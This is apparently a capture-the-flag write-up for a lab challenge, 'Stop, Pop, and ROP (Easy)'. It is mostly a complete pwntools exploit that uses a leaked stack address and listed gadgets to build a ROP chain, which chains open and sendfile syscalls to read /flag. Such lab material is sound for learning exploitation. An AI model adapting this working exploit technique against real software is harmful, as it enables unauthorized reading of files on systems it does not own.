## Stop, Pop, and ROP (Easy)

![](Attachments/Pasted%20image%2020261026155620.png)

This challenge simulates a stack leak so we can reference values in the stack. It also gives us a whole bunch of "free gadgets".

![](Attachments/Pasted%20image%2020261026155957.png)

We run `rp++` to see what we can and cannot do with this program.

![](Attachments/Pasted%20image%2020261102142835.png)

We have a whole bunch of interesting gadgets to work with here notably `syscall` and the ability to pop into most of the calling registers.

![](Attachments/Pasted%20image%2020261102142734.png)

Knowing we have the location of `RSP` via a simulated stack leak we can craft our ROP chain.

```python
from pwn import *

# Define constants to be used later, hopefully this helps with future challenges
POP_RAX = 0x401e2e
POP_RDI = 0x401e3e
POP_RSI = 0x401e36
POP_RDX = 0x401e26
POP_R10 = 0x401e5e
SYSCALL = 0x401e46

# Gadget setup helpers
def pop_rax(num):
    return p64(POP_RAX) + p64(num)
    
def pop_rdi(num):
    return p64(POP_RDI) + p64(num)
    
def pop_rsi(num):
    return p64(POP_RSI) + p64(num)
    
def pop_rdx(num):
    return p64(POP_RDX) + p64(num)
    
def pop_r10(num):
    return p64(POP_R10) + p64(num)
    
def rax_syscall(syscall_num):
    return pop_rax(syscall_num) + p64(SYSCALL)
    
def payload(buf):
    # point to the flag location, with the leaked buffer location in mind
    payload = b"/flag\x00\x00\x00" 
    payload += b'A'*0x90
    
    # open() call
    payload += pop_rdi(buf)
    payload += pop_rsi(0)
    payload += rax_syscall(2)
    
    # sendfile() call
    payload += pop_rdi(1)
    payload += pop_rsi(3) # guess the fd... better way to do this?
    payload += pop_rdx(0)
    payload += pop_r10(1000)
    payload += rax_syscall(40)
    
    return payload
    
def main():
    context.binary = "/challenge/stop-pop-and-rop-easy"
    p = context.binary.process()
    p.recvuntil(b"located at: ")
    buf = int(p.recvline().strip().rstrip(b"."), 16)
    
    p.send(payload(buf))
    
    print(p.readall().decode('utf-8'))

if __name__ == "__main__":
    main()
```
